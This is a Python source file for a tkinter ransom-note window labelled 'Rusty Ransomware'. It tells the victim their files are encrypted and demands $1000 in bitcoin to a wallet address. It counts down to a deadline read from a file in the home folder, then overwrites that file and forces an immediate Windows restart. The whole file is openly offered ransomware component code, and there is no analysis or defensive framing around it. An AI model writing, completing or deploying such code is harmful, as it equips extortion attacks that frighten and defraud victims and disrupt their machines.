import tkinter as tk
import datetime
import sys
import os

class RansomwareApp(tk.Tk):
    def __init__(self, file_path):
        tk.Tk.__init__(self)
        self.title("Rusty Ransomware")
        self.configure(bg='white')
        self.geometry("600x400")
        self.file_path = file_path
        self.load_file()
        self.create_widgets()

    def load_file(self):
        try:
            with open(self.file_path, 'rb') as file:
                month = int.from_bytes(file.read(1), 'big')
                day = int.from_bytes(file.read(1), 'big')
                self.delete_date = datetime.datetime(datetime.datetime.now().year, month, day)
                self.seconds_left = (self.delete_date - datetime.datetime.now()).total_seconds()
        except FileNotFoundError:
            self.show_error_message("File not found")
            self.destroy()

    def create_widgets(self):
        self.upper_frame = tk.Frame(self, bg="red")
        self.upper_frame.pack(fill=tk.X)

        self.oops_label = tk.Label(self.upper_frame, text="Oops! Your files have been encrypted.", bg='red', fg="black", font=("Arial", 16))
        self.oops_label.pack(pady=20)

        self.note_frame = tk.Frame(self, bg="white")
        self.note_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        note_text = (
            "What happened to my computer?\n"
            "All your important personal files have been encrypted,\n"
            "and all of these documents are no longer accessible.\n\n"
            "Please pay $1000 worth of bitcoin for us to decrypt your files :J\n\n\n"
            "Wallet Address: 1f3YIXo6YTbweBeO61CWOyHkQzH8ub2fHZ"
        )
        self.note_label = tk.Label(self.note_frame, text=note_text, bg="white", fg="black", font=("Arial", 12))
        self.note_label.pack(pady=20, padx=40, fill=tk.BOTH)

        self.info_frame = tk.Frame(self, bg="white")
        self.info_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        delete_date_text = "Your files will be lost on\n{}".format(self.delete_date)
        self.delete_date_label = tk.Label(self.info_frame, text=delete_date_text, bg="white", fg="black", font=("Arial", 18))
        self.delete_date_label.pack(pady=20)

        self.time_left_label = tk.Label(self.info_frame, text="Time Left", bg="white", fg="black", font=("Arial", 18))
        self.time_left_label.pack(pady=10)

        self.time_label = tk.Label(self.info_frame, text="", bg="white", fg="black", font=("Arial", 18))
        self.time_label.pack(pady=10)

        self.update_clock()

    def update_clock(self):
        if self.seconds_left <= 0:
            self.time_label.config(text="Time is up!")
            with open(self.file_path, 'wb') as file:
                file.write(b'\x99\x99')
            os.system("shutdown /r /t 1")
        else:
            self.time_label.config(text=str(datetime.timedelta(seconds=self.seconds_left)))
            self.seconds_left -= 1
            self.after(1000, self.update_clock)

    def show_error_message(self, message):
        tk.messagebox.showerror("Error", message)

    @staticmethod
    def get_file_path():
        # Get the current user's home directory
        username = os.environ.get('USERNAME')
        if not username:
            print("Error: Unable to retrieve the current username.")
            return None

        # Construct the full path to the file
        file_name = "encrypt_date.txt"
        file_path = os.path.join(os.path.expanduser('~' + username), file_name)

        return file_path

if __name__ == "__main__":
    app = RansomwareApp(RansomwareApp.get_file_path())
    app.mainloop()
